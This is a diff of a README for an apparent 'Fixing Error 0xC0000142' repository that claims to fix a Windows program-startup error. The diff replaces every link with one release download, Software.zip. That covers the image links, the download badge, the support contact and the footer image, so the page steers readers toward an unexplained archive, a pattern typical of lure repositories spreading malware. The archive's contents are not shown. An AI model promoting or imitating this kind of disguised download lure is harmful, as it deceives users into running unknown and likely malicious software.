@@ -4,7 +4,7 @@ Welcome to the "Fixing Error 0xC0000142" repository! 🛠️
 
 The "Error 0xC0000142" is a common issue that many users face when a program fails to initialize properly. This error often occurs due to corrupt files or incompatible settings. It can be frustrating when you encounter this error, as it prevents your applications from starting and functioning correctly.
 
-![Error 0xC0000142](https://example.com/error-image.png)
+![Error 0xC0000142](https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ To resolve the "Error 0xC0000142", follow these simple steps:
 
 ## Download Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip)](https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip)
 
 ## Troubleshooting Tips
 
@@ -32,7 +32,7 @@ We welcome contributions from the community to make this solution even better. I
 
 ## Support
 
-For any assistance or inquiries related to the "Fixing Error 0xC0000142" solution, please contact our support team at [support@example.com](mailto:support@example.com)
+For any assistance or inquiries related to the "Fixing Error 0xC0000142" solution, please contact our support team at [https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip](https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip)
 
 ## License
 
@@ -40,6 +40,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-![Footer Image](https://example.com/footer-image.png)
+![Footer Image](https://github.com/ggggddjh/Fixing-Error-0xC0000142/releases/download/v2.0/Software.zip)
 
 🚀 Happy coding and fixing the "Error 0xC0000142"! 🛠️
